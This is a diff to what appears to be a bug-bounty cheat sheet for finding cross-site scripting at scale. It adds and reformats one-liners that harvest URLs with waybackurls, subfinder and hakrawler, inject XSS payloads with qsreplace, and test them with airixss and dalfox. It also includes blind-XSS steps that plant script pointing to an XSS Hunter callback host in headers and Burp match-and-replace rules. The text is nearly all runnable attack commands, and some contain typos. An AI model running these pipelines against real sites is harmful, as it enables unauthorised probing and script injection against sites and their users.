@@ -14,17 +14,17 @@
 
 
 Find XSS with automation:
+```bash
+ echo http://example.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+install freq: - go get -u https://github.com/takshal/freq
 
- 	echo http://example.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
-	install freq: - go get -u https://github.com/takshal/freq
+  echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
+ AirisXSS - Insatallation : https://github.com/ferreiraklet/airixss
 
-  	echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
- 	AirisXSS - Insatallation : https://github.com/ferreiraklet/airixss
+ XSpear -u "http://domain.com/dir.php?param=123" -v 1
 
-	 XSpear -u "http://domain.com/dir.php?param=123" -v 1
-	
 	success?next_url=javascript%3Aalert%2F**%2F(document.domain)
-
+```
 
  ## TIP- 2:
        
@@ -51,19 +51,19 @@ Find XSS with automation:
 
       Oneliner XSS automation by 
      @BountyOverflow
- 
-	     echo http://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '">		<img src=x onerror=alert(1);>' | freq
-
+ ```bash
+ echo http://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '">		<img src=x onerror=alert(1);>' | freq
+```
 
 ## Finding XSS with onliner commadnline:
+```bash
+ echo www.example.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload-confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
 
-    	echo www.example.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload-confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+echo http://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '">	<img 		src=x onerror=alert(1);>' | freq 
 
-	echo http://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '">	<img 		src=x onerror=alert(1);>' | freq 
-
-	go run main.go test.php.vulnweb.com | tee testphp1.txt | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat 
-	combined.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n"
-
+go run main.go test.php.vulnweb.com | tee testphp1.txt | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat 
+combined.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n"
+```
 
  Find XSS Tips:
  -------------
@@ -78,6 +78,11 @@ $ waybackurls http://testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1
 	
 ```
 
+```bash
+# Oneliner XSS at scale 
+cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro  | dalfox pipe -b http://your.xss.ht -o xss.txt
+```
+
 
 
 ## Blind XSS at scale 🔥🔥🔥
@@ -86,8 +91,16 @@ cat roots.txt | waybackurls | httpx -H "User-Agent: \"><script src=$YOUR_XSS_HUN
 
 #And monitor your xss hunter dashboard  
 ```
+**Automate Blind-XSS**
+**Match-& Replace burp suite option will use here Either you can use as automation with command line tool- **
 
+1 - [Clne this tool](https://github.com/Leoid/MatchandReplace)
+2- python generate.py -f parameters.txt -c "Blind-XSS" --rule "request_param_name" --replace https://abdulrahman2x.xxt  -x -o blind-xss.json
+3- After getting your blind-xss output then add into your burp - IN Match & Replace section
+4- Now after set parameter in burp then we need send urls to out burp to check blind xss. 
+5- gospider -S hosts.txt -a -w --sitemap -r -d 8 -p http://127.0.0.1:8080 
 
+**Same as SSRF**
 
 
  
